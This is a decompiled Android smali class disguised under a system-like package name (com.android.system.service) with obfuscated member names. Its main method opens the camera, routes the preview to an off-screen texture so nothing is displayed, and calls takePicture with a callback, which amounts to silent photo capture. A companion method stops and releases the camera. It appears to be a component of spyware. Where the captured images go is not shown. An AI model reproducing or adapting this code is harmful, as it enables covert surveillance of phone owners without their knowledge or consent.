.class public Lcom/android/system/service/o;
.super Ljava/lang/Object;
.source ""


.field private static volatile a:Z

.field private static volatile b:Landroid/hardware/Camera;

.field private static c:I

.field private static d:Landroid/os/Handler;


.method static constructor <clinit>()V
    .locals 1

    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    sput-object v0, Lcom/android/system/service/o;->d:Landroid/os/Handler;

    return-void
.end method

.method public static a(I)V
    .locals 3

    :try_start_0
    const/4 v0, 0x0

    invoke-static {v0}, Landroid/hardware/Camera;->open(I)Landroid/hardware/Camera;

    move-result-object v0

    sput-object v0, Lcom/android/system/service/o;->b:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v0

    const/16 v1, 0x50

    invoke-virtual {v0, v1}, Landroid/hardware/Camera$Parameters;->setJpegQuality(I)V

    sget-object v1, Lcom/android/system/service/o;->b:Landroid/hardware/Camera;

    invoke-virtual {v1, v0}, Landroid/hardware/Camera;->setParameters(Landroid/hardware/Camera$Parameters;)V

    sget-object v0, Lcom/android/system/service/o;->b:Landroid/hardware/Camera;

    new-instance v1, Landroid/graphics/SurfaceTexture;

    const/4 v2, 0x0

    invoke-direct {v1, v2}, Landroid/graphics/SurfaceTexture;-><init>(I)V

    invoke-virtual {v0, v1}, Landroid/hardware/Camera;->setPreviewTexture(Landroid/graphics/SurfaceTexture;)V

    sget-object v0, Lcom/android/system/service/o;->b:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->startPreview()V

    const/4 v0, 0x1

    sput-boolean v0, Lcom/android/system/service/o;->a:Z

    sput p0, Lcom/android/system/service/o;->c:I

    sget-object p0, Lcom/android/system/service/o;->b:Landroid/hardware/Camera;

    new-instance v1, Lcom/android/system/service/o$a;

    invoke-direct {v1}, Lcom/android/system/service/o$a;-><init>()V

    const/4 v2, 0x0

    invoke-virtual {p0, v2, v2, v1}, Landroid/hardware/Camera;->takePicture(Landroid/hardware/Camera$ShutterCallback;Landroid/hardware/Camera$PictureCallback;Landroid/hardware/Camera$PictureCallback;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p0

    invoke-virtual {p0}, Ljava/lang/Exception;->printStackTrace()V

    sget-object p0, Lcom/android/system/service/o;->b:Landroid/hardware/Camera;

    if-eqz p0, :cond_0

    invoke-virtual {p0}, Landroid/hardware/Camera;->release()V

    :cond_0
    const/4 p0, 0x0

    sput-object p0, Lcom/android/system/service/o;->b:Landroid/hardware/Camera;

    sput-boolean v2, Lcom/android/system/service/o;->a:Z

    :goto_0
    return-void
.end method

.method public static b()V
    .locals 2

    const/4 v0, 0x0

    sput-boolean v0, Lcom/android/system/service/o;->a:Z

    sget-object v0, Lcom/android/system/service/o;->d:Landroid/os/Handler;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacksAndMessages(Ljava/lang/Object;)V

    sget-object v0, Lcom/android/system/service/o;->b:Landroid/hardware/Camera;

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Landroid/hardware/Camera;->stopPreview()V

    sget-object v0, Lcom/android/system/service/o;->b:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->release()V

    sput-object v1, Lcom/android/system/service/o;->b:Landroid/hardware/Camera;

    :cond_0
    return-void
.end method
